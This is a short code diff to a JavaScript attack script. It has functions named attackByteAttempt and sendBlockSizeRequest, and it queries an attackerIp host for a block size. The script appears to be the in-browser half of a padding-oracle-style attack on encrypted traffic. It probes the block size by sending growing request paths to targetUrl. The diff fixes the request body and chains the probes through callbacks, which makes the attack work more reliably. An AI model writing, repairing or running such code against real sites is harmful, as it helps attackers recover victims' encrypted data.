@@ -16,7 +16,7 @@ function sendRequest(method, url, data, callback, errorcallback, timeout) {
 	request.onerror = function() {
 		errorcallback && errorcallback(request.status, request.statusText)
 	}
-	request.send();
+	request.send(data);
 }
 
 function attackByteAttempt(path, data, success) {
@@ -57,9 +57,8 @@ sendRequest('GET', 'http://' + attackerIp + "/blocksize", null, function (respon
 //  which would indicate that this is the first client to connect back
 function sendBlockSizeRequest() {
 	if (blockSize !== null) return;
-	sendRequest('GET', targetUrl + "/" + blockSizeString);
 	blockSizeString += "a"
-	setTimeout(sendBlockSizeRequest, 100);
+	sendRequest('GET', targetUrl + "/" + blockSizeString, null, sendBlockSizeRequest);
 }
 sendBlockSizeRequest();
 
